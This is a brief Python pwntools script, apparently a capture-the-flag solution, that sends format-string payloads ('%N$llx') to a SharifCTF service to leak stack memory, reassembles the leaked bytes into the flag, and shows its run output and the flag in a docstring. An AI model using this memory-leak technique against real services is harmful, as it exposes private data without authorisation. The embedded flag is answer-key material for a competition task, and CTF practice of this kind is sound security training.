#!/usr/bin/python

"""
$ python s.py 
[+] Opening connection to ctf.sharif.edu on port 54517: Done
Try #136: %136$llx
Try #137: %137$llx
Try #138: %138$llx
Try #139: %139$llx
Try #140: %140$llx
Try #141: %141$llx
[*] Closed connection to ctf.sharif.edu port 54517
flag:  SharifCTF{a5d428632ccc7bfd357c6a128a78a58c}
"""

from pwn import *
r = remote("ctf.sharif.edu", 54517)
flag = ""

for j in range(136, 142):
    print "Try #{}: {}".format(j, "%{}$llx".format(j))
    r.sendline("%{}$llx".format(j))
    r.recvuntil("somewhere.\n")
    f = r.recv(1024).strip()
    flag += f.decode("hex")[::-1]

r.close()

print "flag: ", flag.split("\00")[0]

